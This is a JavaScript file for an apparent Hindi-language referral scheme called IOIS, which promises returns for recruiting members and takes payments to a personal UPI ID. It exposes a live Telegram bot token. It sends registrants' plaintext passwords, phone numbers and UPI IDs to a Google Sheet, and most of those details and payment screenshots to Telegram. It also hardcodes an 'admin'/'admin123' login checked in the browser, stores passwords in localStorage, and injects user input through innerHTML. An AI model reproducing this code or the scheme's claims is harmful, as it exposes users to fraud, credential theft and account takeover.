/* ==========================================================================
   IOIS PLATFORM - MASTER UNIFIED CONNECTION SCRIPT
   ========================================================================== */

// 🚀 LIVE TELEGRAM BOT CREDENTIALS
const TELEGRAM_BOT_TOKEN = "8838741922:AAFGoIvjohnF8FvEiW84h3SxaX2NeANLC50";
const TELEGRAM_CHAT_ID = "964524685";

// 🚀 LIVE GOOGLE SHEETS API WEB APP URL
const GOOGLE_SHEET_API = "https://script.google.com/macros/s/AKfycbzctDXCA4mBL9P-CSWH5OiaealRd8OOt5eRktdjT0wujsYx3XDLnPV6RGxOFACwidBEoA/exec";

// 1. TELEGRAM TEXT ALERT
function sendTelegramAlert(messageText) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
        fetch(url).catch(e => console.log("Telegram Error:", e));
    } catch (err) {}
}

// 2. GOOGLE SHEET AUTO SYNC
function syncToGoogleSheet(data) {
    if (!GOOGLE_SHEET_API) return;
    try {
        fetch(GOOGLE_SHEET_API, {
            method: "POST", mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    } catch (e) {}
}

// 3. AUTO-INJECT CHATBOT WIDGET
function injectChatbotWidget() {
    if (document.getElementById("chatbot-window")) return;

    const botHTML = `
    <div class="fixed bottom-4 right-4 z-50 no-print">
        <button onclick="toggleChatbot()" class="w-12 h-12 bg-gradient-to-r from-amber-400 to-amber-500 text-gray-950 rounded-full shadow-2xl flex items-center justify-center text-xl font-bold border-2 border-white hover:scale-110 transition">
            <i class="fa-solid fa-robot"></i>
        </button>
        <div id="chatbot-window" class="hidden absolute bottom-16 right-0 w-80 bg-[#111c38] border-2 border-amber-500/50 rounded-2xl shadow-2xl p-4 text-xs space-y-3">
            <div class="flex justify-between items-center border-b border-gray-700 pb-2">
                <span class="font-bold text-amber-400">IOIS Live AI Assistant</span>
                <button onclick="toggleChatbot()" class="text-gray-400 hover:text-white text-lg">&times;</button>
            </div>
            <div id="chat-messages" class="h-48 overflow-y-auto space-y-2 pr-1 text-[11px]">
                <div class="bg-slate-900 p-2.5 rounded-xl text-slate-200 border border-slate-700">
                    👋 नमस्ते! मैं IOIS AI सहायक हूँ। पूछें: अर्निंग कैसे करें, विथड्रॉल या डिजिटल किट!
                </div>
            </div>
            <div class="flex gap-1 border-t border-gray-700 pt-2">
                <input type="text" id="chat-input" placeholder="सवाल लिखें..." onkeydown="if(event.key==='Enter') handleChatbotSend()" class="w-full bg-[#030712] border border-gray-700 rounded-lg p-2 text-xs text-white outline-none">
                <button onclick="handleChatbotSend()" class="px-3 bg-amber-400 text-gray-950 font-bold rounded-lg text-xs">Send</button>
            </div>
        </div>
    </div>`;

    document.body.insertAdjacentHTML('beforeend', botHTML);
}

window.toggleChatbot = function() {
    const w = document.getElementById("chatbot-window");
    if (w) w.classList.toggle("hidden");
};

// 4. SMART AI CHATBOT RESPONDER
window.handleChatbotSend = function () {
    const inputEl = document.getElementById("chat-input");
    const chatMsg = document.getElementById("chat-messages");
    if (!inputEl || !chatMsg) return;

    const userText = inputEl.value.trim();
    if (!userText) return;

    chatMsg.innerHTML += `<div class="bg-amber-500/20 text-amber-300 p-2 rounded-xl text-right font-bold ml-6 border border-amber-500/30">${userText}</div>`;
    inputEl.value = "";
    chatMsg.scrollTop = chatMsg.scrollHeight;

    const lower = userText.toLowerCase();
    let reply = "👋 IOIS असिस्टेंट में आपका स्वागत है! आप अर्निंग प्लान, विथड्रॉल या किट के बारे में पूछ सकते हैं।";

    if (lower.includes("पैसा") || lower.includes("कमाई") || lower.includes("earn") || lower.includes("plan")) {
        reply = "💰 **IOIS अर्निंग:** ₹10 का प्लान लेकर 2 लोगों को जोड़ें = ₹14 अर्निंग (100% फीस वापस + मुनाफा)! ₹49 प्लान पर 10 रेफरल पर ₹350 अर्निंग!";
    } else if (lower.includes("withdraw") || lower.includes("विथड्रॉल") || lower.includes("payout")) {
        reply = "⚡ **विथड्रॉल:** डैशबोर्ड पर 'Request UPI Payout Withdrawal' दबाएँ। 24 घंटे के अंदर पैसा सीधे आपके पंजीकृत UPI ID पर आ जाएगा।";
    } else if (lower.includes("card") || lower.includes("कार्ड") || lower.includes("download")) {
        reply = "🆔 **3D कार्ड:** अपने डैशबोर्ड पर जाएँ और 'Download Image (JPG)' या 'Download PDF' दबाकर अपना कार्ड सेव करें।";
    }

    setTimeout(() => {
        chatMsg.innerHTML += `<div class="bg-slate-900 text-slate-200 p-2.5 rounded-xl mr-6 border border-slate-700">${reply.replace(/\n/g, '<br>')}</div>`;
        chatMsg.scrollTop = chatMsg.scrollHeight;
    }, 400);
};

// 5. DOM LOAD CONTROLLER
document.addEventListener("DOMContentLoaded", function () {
    injectChatbotWidget();

    try {
        const urlParams = new URLSearchParams(window.location.search);
        const refCode = urlParams.get('ref');

        if (refCode) {
            const sponsorField = document.getElementById("reg-sponsor-id");
            if (sponsorField) {
                sponsorField.value = refCode.trim();
                sponsorField.classList.add("border-amber-400", "text-amber-400", "font-bold");
            }
            if (typeof window.openRegistrationFlow === "function") {
                window.openRegistrationFlow();
            }
        }
    } catch (e) {}
});

// 6. MODAL CONTROL
window.toggleMobileMenu = function () { document.getElementById("mobile-menu")?.classList.toggle("hidden"); };
window.closeModals = function () { ["reg-modal", "payment-modal", "login-modal", "forgot-id-modal", "reset-pass-modal"].forEach(id => document.getElementById(id)?.classList.add("hidden")); };
window.openRegistrationFlow = function () { window.closeModals(); document.getElementById("reg-modal")?.classList.remove("hidden"); };
window.openLoginModal = function () { window.closeModals(); document.getElementById("login-modal")?.classList.remove("hidden"); };
window.openForgotIDModal = function () { window.closeModals(); document.getElementById("forgot-id-modal")?.classList.remove("hidden"); };
window.openResetPasswordModal = function () { window.closeModals(); document.getElementById("reset-pass-modal")?.classList.remove("hidden"); };

function resetFormErrors() {
    ["reg-name", "reg-email", "reg-phone", "reg-pass", "reg-address", "reg-upi", "reg-qr-file"].forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.classList.remove("border-red-500", "bg-red-950/40");
            el.classList.add("border-gray-700", "bg-[#080d1e]", "text-white");
        }
    });
}

function highlightErrorField(elementId) {
    const el = document.getElementById(elementId);
    if (el) {
        el.classList.remove("border-gray-700", "bg-[#080d1e]");
        el.classList.add("border-red-500", "bg-red-950/40");
        el.focus();
    }
}

// 7. REGISTRATION SUBMIT & CONNECTED USER CREATION
window.handleDetailsSubmit = function (event) {
    event.preventDefault();
    resetFormErrors();

    const name = document.getElementById("reg-name")?.value.trim() || "";
    const email = document.getElementById("reg-email")?.value.trim() || "";
    const phone = document.getElementById("reg-phone")?.value.trim() || "";
    const pass = document.getElementById("reg-pass")?.value.trim() || "";
    const address = document.getElementById("reg-address")?.value.trim() || "";
    const upi = document.getElementById("reg-upi")?.value.trim() || "";
    const sponsorName = document.getElementById("reg-sponsor-name")?.value.trim() || "N/A";
    const sponsorId = document.getElementById("reg-sponsor-id")?.value.trim() || "Direct";
    const qrFiles = document.getElementById("reg-qr-file")?.files || [];
    const cardTier = document.getElementById("reg-card-tier")?.value || "Tiranga Silver Card (₹10)";

    if (!name || name.length < 2) { highlightErrorField("reg-name"); alert("मिसटेक: कृपया अपना पूरा नाम दर्ज करें!"); return; }
    if (!email || !email.includes("@")) { highlightErrorField("reg-email"); alert("मिसटेक: कृपया सही ईमेल एड्रेस दर्ज करें!"); return; }
    if (!phone || phone.replace(/\D/g, '').length < 10) { highlightErrorField("reg-phone"); alert("मिसटेक: कृपया 10 अंकों का व्हाट्सएप नंबर दर्ज करें!"); return; }
    if (!pass || pass.length < 4) { highlightErrorField("reg-pass"); alert("मिसटेक: कृपया कम से कम 4 अक्षरों का पासवर्ड बनाएँ!"); return; }
    if (!address || address.length < 4) { highlightErrorField("reg-address"); alert("मिसटेक: कृपया अपना पूरा पता दर्ज करें!"); return; }
    if (!upi || !upi.includes("@")) { highlightErrorField("reg-upi"); alert("मिसटेक: कृपया सही UPI ID दर्ज करें!"); return; }
    if (!qrFiles || qrFiles.length === 0) { highlightErrorField("reg-qr-file"); alert("मिसटेक: कृपया अपना पेमेंट QR कोड फ़ोटो चुनें!"); return; }

    const match = cardTier.match(/₹(\d+)/);
    let payAmt = "10";
    if (match && match[1]) payAmt = match[1];

    const autoUserId = "IOIS" + Math.floor(100000 + Math.random() * 900000);

    const userObj = {
        userid: autoUserId,
        name: name,
        email: email,
        phone: phone.replace(/\D/g, ''),
        pass: pass,
        address: address,
        upi: upi,
        cardTier: cardTier,
        payAmt: payAmt,
        sponsorId: sponsorId,
        sponsorName: sponsorName,
        status: "Pending Verification",
        screenshot: null,
        registeredAt: new Date().toLocaleDateString('en-IN')
    };

    // Save Connected User Objects in LocalStorage
    localStorage.setItem("iois_current_user_id", autoUserId);
    localStorage.setItem("iois_user_" + autoUserId, JSON.stringify(userObj));

    // Also update legacy keys for fallback
    localStorage.setItem("iois_user_name", name);
    localStorage.setItem("iois_user_email", email);
    localStorage.setItem("iois_user_phone", phone.replace(/\D/g, ''));
    localStorage.setItem("iois_user_pass", pass);
    localStorage.setItem("iois_user_upi", upi);
    localStorage.setItem("iois_user_id", autoUserId);
    localStorage.setItem("iois_user_card_tier", cardTier);

    // Append to Global Members Array for Admin Panel
    let members = JSON.parse(localStorage.getItem('iois_all_members') || "[]");
    members.unshift(userObj);
    localStorage.setItem('iois_all_members', JSON.stringify(members));

    // Telegram Alert & Google Sheet Sync
    const regAlertText = `🚨 *NEW IOIS REGISTRATION ALERT!*\n\n` +
        `👤 *Name:* ${name}\n🆔 *Fixed User ID:* \`${autoUserId}\`\n💳 *Plan:* ${cardTier} (Amount: ₹${payAmt})\n` +
        `📱 *Phone:* ${phone.replace(/\D/g, '')}\n📧 *Email:* ${email}\n🏦 *UPI:* \`${upi}\`\n` +
        `🤝 *Sponsor:* ${sponsorId}`;
    sendTelegramAlert(regAlertText);

    syncToGoogleSheet({ action: "register", ...userObj });

    // Update Step 2 Payment UI
    const descEl = document.getElementById("pay-amount-desc");
    if (descEl) descEl.innerHTML = `<span class="text-amber-400 font-bold block mb-1">चयनित प्लान: ${cardTier}</span> स्कैन करके <strong>₹${payAmt}</strong> पे करें और स्क्रीनशॉट सबमिट करें:`;

    const qrEl = document.getElementById("pay-qr-code");
    if (qrEl) qrEl.src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi://pay?pa=8877490845@spicepay&pn=Vikas%20Kumar&am=${payAmt}`;

    alert(`✅ रजिस्ट्रेशन सफल!\n\nआपकी स्थायी User ID: [${autoUserId}]\n\nअब Step 2 में ₹${payAmt} पे करें।`);
    document.getElementById("reg-modal")?.classList.add("hidden");
    document.getElementById("payment-modal")?.classList.remove("hidden");
};

// 8. SCREENSHOT SUBMIT
window.handleScreenshotSubmit = function (event) {
    event.preventDefault();
    const currentUserId = localStorage.getItem("iois_current_user_id") || localStorage.getItem("iois_user_id");
    const name = localStorage.getItem("iois_user_name") || "User";
    const ssInput = document.getElementById("ss-file");

    if (!ssInput || !ssInput.files || !ssInput.files[0]) {
        alert("⚠️ कृपया पेमेंट स्क्रीनशॉट फ़ोटो सेलेक्ट करें!");
        return;
    }

    const file = ssInput.files[0];

    const reader = new FileReader();
    reader.onload = function(e) {
        const ssBase64 = e.target.result;
        
        // Update user object
        let rawUser = localStorage.getItem("iois_user_" + currentUserId);
        if (rawUser) {
            let u = JSON.parse(rawUser);
            u.screenshot = ssBase64;
            localStorage.setItem("iois_user_" + currentUserId, JSON.stringify(u));
        }

        // Update in global members list
        let members = JSON.parse(localStorage.getItem('iois_all_members') || "[]");
        for (let idx = 0; idx < members.length; idx++) {
            if (members[idx].userid === currentUserId) {
                members[idx].screenshot = ssBase64;
                break;
            }
        }
        localStorage.setItem('iois_all_members', JSON.stringify(members));
    };
    reader.readAsDataURL(file);

    // Send Photo to Telegram
    const formData = new FormData();
    formData.append("chat_id", TELEGRAM_CHAT_ID);
    formData.append("photo", file);
    formData.append("caption", `📸 *IOIS PAYMENT SCREENSHOT SUBMITTED!*\n\n👤 *Name:* ${name}\n🆔 *Fixed User ID:* \`${currentUserId}\``);
    formData.append("parse_mode", "Markdown");

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData }).catch(e => {});

    alert(`✅ स्क्रीनशॉट सबमिट हो गया है! वेरिफिकेशन के लिए अब WhatsApp खुल रहा है।`);
    window.open(`https://wa.me/918877490845?text=Hello%20Admin,%20Maine%20payment%20karke%20screenshot%20submit%20kar%20diya%20hai.%20User%20ID:%20${currentUserId}`, "_blank");
    window.closeModals();
};

// 9. CONNECTED LOGIN VERIFICATION
window.handleLoginSubmit = function (event) {
    event.preventDefault();
    const useridInput = document.getElementById("login-userid")?.value.trim();
    const passInput = document.getElementById("login-pass")?.value.trim();

    if (!useridInput || !passInput) {
        alert("कृपया User ID और Password दर्ज करें!");
        return;
    }

    // A. Admin Login
    if (useridInput.toLowerCase() === "admin" && passInput === "admin123") {
        sessionStorage.setItem("iois_admin_logged_in", "true");
        alert("✅ Admin Login Successful!");
        window.location.href = "admin.html";
        return;
    }

    // B. User Login Verification
    let foundUser = null;

    // Check individual user object
    let rawObj = localStorage.getItem("iois_user_" + useridInput);
    if (rawObj) {
        foundUser = JSON.parse(rawObj);
    } else {
        // Fallback: search in global members list
        let members = JSON.parse(localStorage.getItem('iois_all_members') || "[]");
        foundUser = members.find(m => m.userid === useridInput);
    }

    if (!foundUser) {
        // Check legacy fallback
        const savedUserId = localStorage.getItem("iois_user_id");
        const savedPass = localStorage.getItem("iois_user_pass");
        if (savedUserId === useridInput && savedPass === passInput) {
            localStorage.setItem("iois_current_user_id", savedUserId);
            alert(`लॉगिन सफल! स्वागत है [${savedUserId}]`);
            window.location.href = "dashboard.html";
            return;
        }
        alert("⚠️ कोई अकाउंट नहीं मिला! कृपया पहले 'Register' करें।");
        return;
    }

    if (foundUser.pass === passInput) {
        localStorage.setItem("iois_current_user_id", foundUser.userid);
        localStorage.setItem("iois_user_name", foundUser.name);
        localStorage.setItem("iois_user_email", foundUser.email);
        localStorage.setItem("iois_user_phone", foundUser.phone);
        localStorage.setItem("iois_user_upi", foundUser.upi);
        localStorage.setItem("iois_user_id", foundUser.userid);
        localStorage.setItem("iois_user_card_tier", foundUser.cardTier);

        alert(`✅ लॉगिन सफल! स्वागत है [${foundUser.name}]`);
        window.location.href = "dashboard.html";
    } else {
        alert("⚠️ गलत Password! कृपया सही पासवर्ड डालें।");
    }
};

// 10. RECOVERY HANDLERS
window.handleForgotIDSubmit = function (event) {
    event.preventDefault();
    const input = document.getElementById("forgot-contact-input")?.value.trim();
    let members = JSON.parse(localStorage.getItem('iois_all_members') || "[]");
    let found = members.find(m => m.email === input || m.phone === input);

    if (found) {
        alert(`✅ खाता मिल गया!\n\nआपकी स्थायी Fixed User ID है: [${found.userid}]`);
        window.closeModals();
    } else {
        alert("⚠️ इस ईमेल या व्हाट्सएप नंबर से कोई अकाउंट नहीं मिला!");
    }
};

window.handleResetPasswordSubmit = function (event) {
    event.preventDefault();
    const userid = document.getElementById("reset-userid-input")?.value.trim();
    const contact = document.getElementById("reset-contact-input")?.value.trim();
    const newPass = document.getElementById("reset-newpass-input")?.value.trim();

    let members = JSON.parse(localStorage.getItem('iois_all_members') || "[]");
    let foundIndex = members.findIndex(m => m.userid === userid && (m.email === contact || m.phone === contact));

    if (foundIndex !== -1) {
        members[foundIndex].pass = newPass;
        localStorage.setItem('iois_all_members', JSON.stringify(members));
        
        let uObj = localStorage.getItem("iois_user_" + userid);
        if (uObj) {
            let u = JSON.parse(uObj);
            u.pass = newPass;
            localStorage.setItem("iois_user_" + userid, JSON.stringify(u));
        }

        alert("✅ पासवर्ड सफलतापूर्वक बदल दिया गया है! अब लॉगिन करें।");
        window.closeModals();
    } else {
        alert("⚠️ User ID या रजिस्टर्ड ईमेल/नंबर मैच नहीं हुआ!");
    }
};

window.validateFileSize = function (input) {
    if (input && input.files && input.files[0]) {
        if (input.files[0].size > 25 * 1024 * 1024) { alert("⚠️ फ़ाइल 25 MB से बड़ी है!"); input.value = ""; }
    }
};

window.userLogout = function () {
    localStorage.removeItem("iois_current_user_id");
    alert("Logged out successfully!");
    window.location.href = "index.html";
};

window.copyRefLink = function () {
    const refInput = document.getElementById("ref-link");
    if (refInput) { navigator.clipboard.writeText(refInput.value); alert("Aapka unique referral link copy ho gaya hai!"); }
};

window.copyUPI = function () {
    navigator.clipboard.writeText("8877490845@spicepay").then(() => alert("UPI ID copied!"));
};
